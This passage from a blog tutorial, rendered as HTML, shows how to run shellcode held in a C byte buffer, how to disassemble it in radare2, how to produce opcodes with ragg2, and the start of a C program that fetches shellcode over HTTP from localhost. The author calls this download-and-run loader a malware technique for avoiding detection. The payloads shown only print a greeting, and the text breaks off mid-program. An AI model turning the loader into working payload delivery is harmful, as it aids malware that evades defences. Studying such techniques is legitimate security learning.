  <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
  <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span>
  <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
  <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xfd</span>
<span class="p">};</span>
</code></pre></div></div>
<p>That will return a buffer containing the function-shellcode to us so we can use it in our <em>evil activities</em></p>

<p>Inside the code will work like this</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include&lt;string.h&gt;
#include &lt;stdint.h&gt;
</span>
<span class="cp">#define _BUFFER_SIZE 256
</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">buffer</span><span class="p">[</span><span class="n">_BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span>
  <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span>
  <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span>
  <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span>
  <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
  <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
  <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span>
  <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span>
  <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
  <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span>
  <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
  <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span>
  <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x00</span>
<span class="p">};</span>


<span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
    
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
    <span class="n">func</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">buffer</span><span class="p">;</span>
    <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
<span class="p">}</span>
</code></pre></div></div>
<p>And inside r2 will go like this:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x5606c6856704</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span>
            <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">entry0</span> <span class="err">@</span> <span class="mh">0x5606c68565bd</span>
<span class="err">┌</span> <span class="mi">33</span><span class="o">:</span> <span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">);</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_8h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span>
<span class="err">│</span>           <span class="mh">0x5606c6856704</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
<span class="err">│</span>           <span class="mh">0x5606c6856705</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="err">│</span>           <span class="mh">0x5606c6856708</span>      <span class="mi">4883</span><span class="n">ec10</span>       <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x10</span>
<span class="err">│</span>           <span class="mh">0x5606c685670c</span>      <span class="mi">488</span><span class="n">d05ed0000</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="n">obj</span><span class="p">.</span><span class="n">buffer</span>     <span class="p">;</span> <span class="mh">0x5606c6856800</span>
<span class="err">│</span>           <span class="mh">0x5606c6856713</span>      <span class="mi">488945</span><span class="n">f8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x5606c6856717</span>      <span class="mi">488</span><span class="n">b55f8</span>       <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x5606c685671b</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x5606c6856720</span>      <span class="n">ffd2</span>           <span class="n">call</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x5606c6856722</span>      <span class="mi">90</span>             <span class="n">nop</span>
<span class="err">│</span>           <span class="mh">0x5606c6856723</span>      <span class="n">c9</span>             <span class="n">leave</span>
<span class="err">└</span>           <span class="mh">0x5606c6856724</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x5606c6856704</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>Same thing at start then the call:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x556afbdba800</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pd</span> <span class="mi">10</span>
            <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">main</span> <span class="err">@</span> <span class="mh">0x556afbdba70c</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">buffer</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rdx</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
            <span class="mh">0x556afbdba800</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
            <span class="mh">0x556afbdba801</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
            <span class="mh">0x556afbdba804</span>      <span class="mi">4883</span><span class="n">ec20</span>       <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x20</span>
            <span class="mh">0x556afbdba808</span>      <span class="mi">64488</span><span class="n">b042528</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
            <span class="mh">0x556afbdba811</span>      <span class="mi">488945</span><span class="n">f8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">-</span> <span class="mi">8</span><span class="p">],</span> <span class="n">rax</span>
            <span class="mh">0x556afbdba815</span>      <span class="mi">31</span><span class="n">c0</span>           <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
            <span class="mh">0x556afbdba817</span>  <span class="o">~</span>   <span class="mi">48</span><span class="n">b848656c6c</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x7266206f6c6c6548</span> <span class="p">;</span> <span class="err">'</span><span class="n">Hello</span> <span class="n">fr</span><span class="err">'</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">str</span><span class="p">.</span><span class="n">Hello_frH</span><span class="o">:</span>
</code></pre></div></div>
<p>There will be our code, running the program will output a “hello friend” without crashing.</p>

<h4 id="downloading-shellcode">Downloading shellcode</h4>

<p>So the smart reader may be probably thinking that as we only need those bytes in a buffer inside memory we can get them from a file or perhaps from a remote server and yes, that technique is commonly used by malware to avoid certain detection mechanisms.</p>

<p>Say we have some code like this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">write</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"Hello!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>It can be as simple or as complex as you want to, the only requisite for it is to be “self-contained” (or to set fixes on the host program) and we want to deliver it to a potential host that is “waiting for him” over the internet. We already know how to get and run it on the host program but how do we translate it into opcodes and deliver it over the network?</p>

<p>We can get those opcodes by using <em>ragg2</em> and then dump them into an hex file:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">:~/</span><span class="n">C</span><span class="err">$</span> 
<span class="o">:~/</span><span class="n">C</span><span class="err">$</span> <span class="n">ragg2</span><span class="o">-</span><span class="n">cc</span>  <span class="o">-</span><span class="n">x</span> <span class="n">w</span><span class="p">.</span><span class="n">c</span>
<span class="n">eb0848656c6c6f210a00bf01000000488d35ecffffffba07000000b8010000000f0531ffb83c0000000f0531c0c3</span>
</code></pre></div></div>
<p>So now we can simply copy and paste this and use hexedit to create a new file and hex-paste it, then we’ll have our bin sc file ready to be delivered by using our favorite http server (or whatever else)</p>

<p>The dump will look like this inside r2:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x00000000</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pd</span> <span class="mi">50</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rflags</span><span class="o">:</span>
<span class="err">┌</span> <span class="mi">38</span><span class="o">:</span> <span class="n">fcn</span><span class="p">.</span><span class="mo">00000000</span> <span class="p">();</span>
<span class="err">│</span>       <span class="err">┌─</span><span class="o">&lt;</span> <span class="mh">0x00000000</span>      <span class="n">eb00</span>           <span class="n">jmp</span> <span class="mi">2</span>
<span class="err">│</span>       <span class="err">│</span>   <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">fcn</span><span class="p">.</span><span class="mo">00000000</span> <span class="err">@</span> 
<span class="err">│</span>       <span class="err">└─</span><span class="o">&gt;</span> <span class="mh">0x00000002</span>      <span class="mi">488</span><span class="n">d351d0000</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x00000026</span><span class="p">]</span>       <span class="p">;</span> <span class="s">"Hello!</span><span class="se">\n</span><span class="s">"</span> <span class="p">;</span> <span class="mi">38</span>
<span class="err">│</span>           <span class="mh">0x00000009</span>      <span class="n">bf01000000</span>     <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="mi">1</span>
<span class="err">│</span>           <span class="mh">0x0000000e</span>      <span class="n">ba07000000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">7</span>
<span class="err">│</span>           <span class="mh">0x00000013</span>      <span class="n">b801000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">1</span>
<span class="err">│</span>           <span class="mh">0x00000018</span>      <span class="mi">0</span><span class="n">f05</span>           <span class="n">syscall</span>
<span class="err">│</span>           <span class="mh">0x0000001a</span>      <span class="mi">31</span><span class="n">ff</span>           <span class="n">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>
<span class="err">│</span>           <span class="mh">0x0000001c</span>      <span class="n">b83c000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x3c</span>               <span class="p">;</span> <span class="sc">'&lt;'</span> <span class="p">;</span> <span class="mi">60</span>
<span class="err">│</span>           <span class="mh">0x00000021</span>      <span class="mi">0</span><span class="n">f05</span>           <span class="n">syscall</span>
<span class="err">│</span>           <span class="mh">0x00000023</span>      <span class="mi">31</span><span class="n">c0</span>           <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">└</span>           <span class="mh">0x00000025</span>      <span class="n">c3</span>             <span class="n">ret</span>
            <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">fcn</span><span class="p">.</span><span class="mo">00000000</span> <span class="err">@</span> <span class="mh">0x2</span>
            <span class="mh">0x00000026</span>      <span class="mi">48656</span><span class="n">c</span>         <span class="n">insb</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span><span class="p">],</span> <span class="n">dx</span>
            <span class="mh">0x00000029</span>      <span class="mi">6</span><span class="n">c</span>             <span class="n">insb</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span><span class="p">],</span> <span class="n">dx</span>
            <span class="mh">0x0000002a</span>      <span class="mi">6</span><span class="n">f</span>             <span class="n">outsd</span> <span class="n">dx</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rsi</span><span class="p">]</span>
            <span class="mh">0x0000002b</span>      <span class="mi">210</span><span class="n">a</span>           <span class="n">and</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rdx</span><span class="p">],</span> <span class="n">ecx</span>
            <span class="mh">0x0000002d</span>      <span class="mo">00</span><span class="n">ff</span>           <span class="n">add</span> <span class="n">bh</span><span class="p">,</span> <span class="n">bh</span>
</code></pre></div></div>
<p>As you see, in here we are directly dealing with syscalls (see the syscall instruction), also note that we have two of them one for print one for exit and the string is somehow selfcontained within the code.</p>

<p>Let’s go for the host programnow, it will look similar as the previous http client we messed with:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt; 
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="cp">#define BSIZE 256
#define KSIZE 11
</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
   <span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">portno</span><span class="p">,</span> <span class="n">n</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serv_addr</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">hostent</span> <span class="o">*</span><span class="n">server</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="n">KSIZE</span><span class="p">];</span>
   <span class="kt">char</span> <span class="n">request</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"GET /sh HTTP/1.1</span><span class="se">\r\n</span><span class="s">User-Agent: nc/0.0.1</span><span class="se">\r\n</span><span class="s">Host: 127.0.0.1</span><span class="se">\r\n</span><span class="s">Accept: */*</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BSIZE</span><span class="p">];</span>

   <span class="n">portno</span> <span class="o">=</span> <span class="mi">80</span><span class="p">;</span>
   <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
   <span class="n">server</span> <span class="o">=</span> <span class="n">gethostbyname</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>

   
